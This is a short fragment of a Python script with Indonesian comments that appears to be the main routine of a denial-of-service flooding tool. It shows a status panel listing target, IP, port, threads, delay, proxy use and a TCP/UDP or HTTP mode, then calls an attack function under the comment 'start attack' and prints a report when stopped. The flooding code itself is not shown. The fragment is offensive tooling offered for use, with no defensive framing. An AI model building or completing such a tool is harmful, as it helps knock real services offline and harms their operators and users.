    status_line = f"Keep-Alive: {'[green][+] Server aktif[/green]' if alive else '[red][-] Tidak responsif[/red]'}"

    # ðŸ”¥ Kumpulkan semua info untuk boot panel
    boot_lines = [
        f"Target: {display_target}",
        f"IP: {ip}",
        f"Port: {port if port else 'Random'}",
        f"Threads: {threads}",
        f"Delay: {delay_min}-{delay_max}s",
        f"Proxy: {'ON' if proxies else 'OFF'}",
        f"Mode: {http_mode if http_mode else 'TCP/UDP'}",
        status_line
    ]

    # ðŸ”” Tambahkan warning proxy khusus untuk HTTP/3
    if http_mode == "3":
        boot_lines.append("[yellow][!] Proxy tidak digunakan karena mode HTTP/3.[/yellow]")

    ui.boot(boot_lines)

    # ðŸ”« Mulai serangan
    attack(ip, port, threads, delay_min, delay_max, ui, proxies, target_url, http_mode)

    # ðŸ“Š Tampilkan report saat CTRL+C
    ui.report()

if __name__ == "__main__":
    main()



